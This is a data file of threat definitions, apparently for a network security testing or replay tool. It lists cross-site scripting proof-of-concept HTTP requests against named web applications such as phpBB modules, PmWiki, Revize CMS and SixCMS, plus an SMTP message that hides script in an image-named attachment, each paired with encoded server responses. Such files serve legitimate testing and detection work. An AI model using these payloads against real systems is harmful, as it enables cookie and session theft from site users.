﻿oracle_reports_xss.xml,Oracle Reports Server XSS Attempt,This threat represents an attempt to cause a cross-site scripting attack on Oracle Reports 10g.  This can be used to gain user credentials and other sensitive user data.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿php_phpinfo_xss.xml,PHP 4.4.3 - 4.4.6 phpinfo() Remote Cross-Site Scripting Variant Vulnerability,"This threat attempts to cause a cross site scripting condition through the phpinfo() function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. PHP is a web application and programming language, it is used typically web servers listening on port 80.",HTTP,TCP,GET /phpinfo.php?a[]=<script>alert(/XSS/)||3B ||</script> HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || msnbot/1.0||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
php_phpinfo_xss.xml,PHP 4.4.3 - 4.4.6 phpinfo() Remote Cross-Site Scripting Variant Vulnerability,"This threat attempts to cause a cross site scripting condition through the phpinfo() function call. By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details. PHP is a web application and programming language, it is used typically web servers listening on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpbb_datenbank_xss.xml,Datenbank Module For PHPBB Remote Mod.PHP Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript which is included in the returned page. PHPBB is a we based application that typically listens on port 80.,HTTP,TCP,"GET www.example.com/phpBB/moddb/mod.php?id='>&lt||3B ||script&gt||3B ||alert(document.cookie)&lt||3B ||/script&gt||3B || HTTP/1.0||0D 0A ||User-Agent||3A || Mozilla/5.0 (X11||3B || U||3B || Linux x86_64||3B || en-US||3B || rv||3A ||1.7.12) Gecko/20051020 Epiphany/1.8.2||0D 0A ||Accept||3A || text/xml,application/xml,application/xhtml+xml,text/html||3B ||q=0.9,text/plain||3B ||q=0.8,image/png,*/*||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip,deflate||0D 0A ||Accept-Charset||3A || ISO-8859-1,utf-8||3B ||q=0.7,*||3B ||q=0.7||0D 0A ||Keep-Alive||3A || 300..Connection||3A || keep-alive..Cache-Control||3A || max-age=0||0D 0A 0D 0A||"
phpbb_datenbank_xss.xml,Datenbank Module For PHPBB Remote Mod.PHP Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript which is included in the returned page. PHPBB is a we based application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpcommunitycalendar_xss.xml,phpCommunityCalendar 4.0.3 Cross Site Scripting Vulnerability,"This threat sends a crafted HTTP query containing HTML to be included in the returned page via month.php's ""LoName"" parameter. phpCommunityCalendar is a web based application that typically listens on port 80.",HTTP,TCP,"GET /month.php?LoName=<script>alert('XSS')</script> HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
phpcommunitycalendar_xss.xml,phpCommunityCalendar 4.0.3 Cross Site Scripting Vulnerability,"This threat sends a crafted HTTP query containing HTML to be included in the returned page via month.php's ""LoName"" parameter. phpCommunityCalendar is a web based application that typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpcommunitycalendar_xss_b.xml,phpCommunityCalendar 4.0.3 Cross Site Scripting Vulnerability,"This threat sends a crafted HTTP query containing HTTP to be included in the returned page via event.php's ""link"" parameter. phpCommunityCalendar is a web based application that typically listens on port 80.",HTTP,TCP,"GET /event.php?AddressLink=||22 ||><script>alert('XSS')</script><||22 || HTTP/1.1||0D 0A ||Accept||3A || text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav||0D 0A ||Accept-Encoding||3A || gzip, compress||0D 0A ||Accept-Language||3A || en||0D 0A ||User-Agent||3A || Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i||0D 0A ||HOST||3A || www.example.com||0D 0A 0D 0A||"
phpcommunitycalendar_xss_b.xml,phpCommunityCalendar 4.0.3 Cross Site Scripting Vulnerability,"This threat sends a crafted HTTP query containing HTTP to be included in the returned page via event.php's ""link"" parameter. phpCommunityCalendar is a web based application that typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpinfoXSS.xml,phpinfo() Cross Site Scripting Attempt,"This threat attempts to cause a cross site scripting condition through the phpinfo function call.  By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details.  PHP is a web application, and typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpraid_XSS.xml,PHPraid View.php Cross-Site Scripting Vulnerability,"This threat attempts to cause a cross site scripting condition through the View.php function call.  By exploiting this XSS vulnerability an attacker can steal session and cookie authentication details.  PHPraid is a web application, and typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿pmwiki_xss.xml,PmWiki Search Cross-Site Scripting Vulnerability,This threat sends a crafted HTTP Request with with a modified URL string containing HTML or Javascript. PmWiki is a web application that typically listens on port 80.,HTTP,TCP,"GET /Site/Search?action=search&q=TRY%20ANOTHER%20SEARCH%20NOW!%20YES,%20YOU!'%20onMouseOver='alert(document.title)||3B ||'%20  HTTP/1.0||0D 0A 0D 0A||"
pmwiki_xss.xml,PmWiki Search Cross-Site Scripting Vulnerability,This threat sends a crafted HTTP Request with with a modified URL string containing HTML or Javascript. PmWiki is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿refererXSS.xml,Generic Referer XSS Attempt,"This attack represents a cross-site scripting attack through the referer field of HTTP.  This field is used in logfile analysis and some server side scripting.  By injecting javascript into this field, code can be executed through the webpage and be used to steal session and login information.",HTTP,TCP,GET / HTTP/1.0||0A ||Referer||3A || http||3A ||//||22 ||/><SCRIPT>alert('1mp3rf3ctXSS')||3B ||</SCRIPT>||0A 0A 0A||
refererXSS.xml,Generic Referer XSS Attempt,"This attack represents a cross-site scripting attack through the referer field of HTTP.  This field is used in logfile analysis and some server side scripting.  By injecting javascript into this field, code can be executed through the webpage and be used to steal session and login information.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿reloadcms_xss_cmi.xml,ReloadCMS User-Agent HTML Injection Vulnerability,"This threat sends a standard HTTP query containing html or php within the User-Agent header field, this flaw can be used as either a XSS or remote code execution flaw. ReloadCMS  typically listens on port 80.",HTTP,TCP,GET /reloadcms/ HTTP/1.0||0D 0A ||User-Agent||3A 0D 0A 22 ||><script>alert(||22 ||sucka||22 ||)||3B ||</script>||0D 0A ||Host||3A || www.example.com||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
reloadcms_xss_cmi.xml,ReloadCMS User-Agent HTML Injection Vulnerability,"This threat sends a standard HTTP query containing html or php within the User-Agent header field, this flaw can be used as either a XSS or remote code execution flaw. ReloadCMS  typically listens on port 80.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿revizecms_xss.xml,Revize CMS HTTPTranslatorServlet XSS,This threat sends a crafted URL query that contains HTML or javascript to be included in the page. Revize CMS is an web application that typically listens on port 80.,HTTP,TCP,GET /revize/HTTPTranslatorServlet?redirect=/revize/admincenter/setWebSpace.jsp&action=login&resourcetype=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3Esecurity&objectmap=subject&error=admincenter/login.jsp HTTP/1.0||0D 0A 0D 0A||
revizecms_xss.xml,Revize CMS HTTPTranslatorServlet XSS,This threat sends a crafted URL query that contains HTML or javascript to be included in the page. Revize CMS is an web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿rhino_xss.xml,Rhino XSS Attack,This threat demonstrates a cross-site scripting attack in RhinoSoft's webserver component of dns4me.,HTTP,TCP,"GET /?%3E%3Cscript%3Ealert('1mp3rf3ctr0x')%3C/script%3E HTTP/1.1||0D 0A ||User-Agent||3A || Mozilla/5.0 (X11||3B || U||3B || Linux i686||3B || en-US||3B || rv||3A ||1.7) Gecko/20040626 Firefox/0.9.1||0D 0A ||Accept||3A || text/xml,application/xml,application/xhtml+xml,text/html||3B ||q=0.9,text/plain||3B ||q=0.8,image/png,*/*||3B ||q=0.5||0D 0A ||Accept-Language||3A || en-us,en||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip,deflate||0D 0A ||Accept-Charset||3A || ISO-8859-1,utf-8||3B ||q=0.7,*||3B ||q=0.7||0D 0A ||Keep-Alive||3A || 300||0D 0A ||Connection||3A || keep-alive||0D 0A 0D 0A||"
rhino_xss.xml,Rhino XSS Attack,This threat demonstrates a cross-site scripting attack in RhinoSoft's webserver component of dns4me.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿rwauction_xss.xml,RWAuction Pro Search.ASP Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript or HTML to be included in the returned page. RWAuction an web application that typically listens on port 80.,HTTP,TCP,GET /search.asp?searchtxt=<SCRIPT>alert(||22 ||XSS||22 ||)</SCRIPT> HTTP/1.0||0D 0A 0D 0A||
rwauction_xss.xml,RWAuction Pro Search.ASP Cross-Site Scripting Vulnerability,This threat sends a crafted URL that contains Javascript or HTML to be included in the returned page. RWAuction an web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿sawmill_xss.xml,Sawmill XSS Attempt,"This threat is executed when an attacker causes a victim to view a webpage with Javascript injected.  This can lead to various forms of identity theft.  This particular attack could work well against any HTTP based web system.  Sawmill is a web based log analysis tool, and typically listens on port 8987.",HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿selectapix_xss.xml,SelectaPix Cross-Site Scripting,This threat sends a crafted URL that contains Javascript which is included in the returned page. SelectaPix is an web application that typically listens on port 80,HTTP,TCP,GET /popup.php?albumID=2&imageID=<script>alert(document.cookie)</script> HTTP/1.0||0D 0A ||Host||3A || www.example.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
selectapix_xss.xml,SelectaPix Cross-Site Scripting,This threat sends a crafted URL that contains Javascript which is included in the returned page. SelectaPix is an web application that typically listens on port 80,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿sixcms_xss.xml,SixCMS 6.0 List.PHP Cross-Site Scripting Vulnerability,This threat sends a crafted url to take advantage of a flaw in SixCMS's List.php function which would allow a malicious user to  execute code on the affected site. SixCMS is a web application the typically listens on port 80.,HTTP,TCP,GET /list.php?page=<script>alert(||22 ||XSS||22 ||)</script> HTTP/1.0||0D 0A ||Host||3A || www.targets.org||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
sixcms_xss.xml,SixCMS 6.0 List.PHP Cross-Site Scripting Vulnerability,This threat sends a crafted url to take advantage of a flaw in SixCMS's List.php function which would allow a malicious user to  execute code on the affected site. SixCMS is a web application the typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿sqwebmail_xss.xml,SqWebMail Attachment XSS,"This threat sends an email with a .jpg extension but with a MIME encoding of text/html.  This causes the SqWebMail email application to execute the Javascript contained inside.  This Javascript can be used to create a cross site scripting situation where the attacker can create and delete email without user intervention.  SqWebMail is a web based email application.  This threat targets the SMTP MTA portion of the email delivery, which is typically port 25.",SMTP,TCP,"Message-ID||3A || <430E1FB3.3090905@example.com>||0A ||Date||3A || Thu, 25 Aug 2005 15||3A ||44||3A ||51 -0400||0A ||From||3A || Test <test@example.com>||0A ||MIME-Version||3A || 1.0||0A ||To||3A || Test Two <test2@example.com>||0A ||Subject||3A || here is a picture||0A ||Content-Type||3A || multipart/mixed||3B 0A || boundary=||22 ||------------000705060509080508020102||22 0A 0A ||This is a multi-part message in MIME format.||0A ||--------------000705060509080508020102||0A ||Content-Type||3A || text/plain||3B || charset=ISO-8859-1||3B || format=flowed||0A ||Content-Transfer-Encoding||3A || 7bit||0A 0A 0A ||--------------000705060509080508020102||0A ||Content-Type||3A || text/html||0A ||Content-Transfer-Encoding||3A || binary||0A ||Content-Disposition||3A || attachment||3B || filename=||22 ||image.jpg||22 0A 0A ||<html>||0A ||<body>||0A ||<script>alert(document.domain)||3B ||</script>||0A ||</body>||0A ||</html>||0A 0A ||--------------000705060509080508020102--||0A ||.||0A 0A||"
sqwebmail_xss.xml,SqWebMail Attachment XSS,"This threat sends an email with a .jpg extension but with a MIME encoding of text/html.  This causes the SqWebMail email application to execute the Javascript contained inside.  This Javascript can be used to create a cross site scripting situation where the attacker can create and delete email without user intervention.  SqWebMail is a web based email application.  This threat targets the SMTP MTA portion of the email delivery, which is typically port 25.",SMTP,TCP,220 f||6f ||ster ES||4d ||TP||0d 0a||
sqwebmail_xss.xml,SqWebMail Attachment XSS,"This threat sends an email with a .jpg extension but with a MIME encoding of text/html.  This causes the SqWebMail email application to execute the Javascript contained inside.  This Javascript can be used to create a cross site scripting situation where the attacker can create and delete email without user intervention.  SqWebMail is a web based email application.  This threat targets the SMTP MTA portion of the email delivery, which is typically port 25.",SMTP,TCP,250||2d ||SI||5a ||E 52428800||0d 0a ||250||2d ||PIPE||4c ||I||4e ||I||4e ||G||0d 0a ||250||2d ||AUTH P||4c ||AI||4e || ||4c 4f ||GI||4e 0d 0a||
sqwebmail_xss.xml,SqWebMail Attachment XSS,"This threat sends an email with a .jpg extension but with a MIME encoding of text/html.  This causes the SqWebMail email application to execute the Javascript contained inside.  This Javascript can be used to create a cross site scripting situation where the attacker can create and delete email without user intervention.  SqWebMail is a web based email application.  This threat targets the SMTP MTA portion of the email delivery, which is typically port 25.",SMTP,TCP,250 ||4f 4b 0d 0a||
sqwebmail_xss.xml,SqWebMail Attachment XSS,"This threat sends an email with a .jpg extension but with a MIME encoding of text/html.  This causes the SqWebMail email application to execute the Javascript contained inside.  This Javascript can be used to create a cross site scripting situation where the attacker can create and delete email without user intervention.  SqWebMail is a web based email application.  This threat targets the SMTP MTA portion of the email delivery, which is typically port 25.",SMTP,TCP,250 Accepted||0d 0a||
sqwebmail_xss.xml,SqWebMail Attachment XSS,"This threat sends an email with a .jpg extension but with a MIME encoding of text/html.  This causes the SqWebMail email application to execute the Javascript contained inside.  This Javascript can be used to create a cross site scripting situation where the attacker can create and delete email without user intervention.  SqWebMail is a web based email application.  This threat targets the SMTP MTA portion of the email delivery, which is typically port 25.",SMTP,TCP,354 E||6e ||ter ||6d ||essage||2c || e||6e ||di||6e ||g with ||22 2e 22 || ||6f 6e || a ||6c ||i||6e ||e by itse||6c ||f||0d 0a||
sqwebmail_xss.xml,SqWebMail Attachment XSS,"This threat sends an email with a .jpg extension but with a MIME encoding of text/html.  This causes the SqWebMail email application to execute the Javascript contained inside.  This Javascript can be used to create a cross site scripting situation where the attacker can create and delete email without user intervention.  SqWebMail is a web based email application.  This threat targets the SMTP MTA portion of the email delivery, which is typically port 25.",SMTP,TCP,250 ||4f 4b || id||3d ||1HcVW||6f 2d ||0007YR||2d ||S8
sqwebmail_xss.xml,SqWebMail Attachment XSS,"This threat sends an email with a .jpg extension but with a MIME encoding of text/html.  This causes the SqWebMail email application to execute the Javascript contained inside.  This Javascript can be used to create a cross site scripting situation where the attacker can create and delete email without user intervention.  SqWebMail is a web based email application.  This threat targets the SMTP MTA portion of the email delivery, which is typically port 25.",SMTP,TCP,221 f||6f ||ster c||6c 6f ||si||6e ||g c||6f 6e 6e ||ecti||6f 6e 0d 0a||
